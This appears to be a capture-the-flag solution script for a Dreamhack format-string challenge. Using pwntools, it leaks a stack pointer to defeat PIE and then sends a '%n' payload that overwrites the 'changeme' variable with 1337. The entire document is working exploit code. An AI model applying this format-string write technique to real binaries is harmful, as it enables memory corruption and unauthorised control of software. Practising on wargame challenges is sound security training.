#!/usr/bin/python3

from pwn import *

#p = process("./fsb_overwrite")
p = remote("host1.dreamhack.games", 22984)
e = ELF("./fsb_overwrite")

target = e.sym['changeme']
offset = 8
value = 1337

# Bypass PIE

p.sendline("%12$p")
base = int(p.recvline().decode('utf-8').strip("\n"), 16) - e.sym['__libc_csu_init']
log.info("Base: " + hex(base))

payload = "%{}c".format(value).encode('utf-8')
payload += "%{}$n".format(offset).encode('utf-8')
payload += "C".encode('utf-8') * (0x10 - len(payload))
payload += p64(target + base)

p.sendline(payload)

p.interactive()
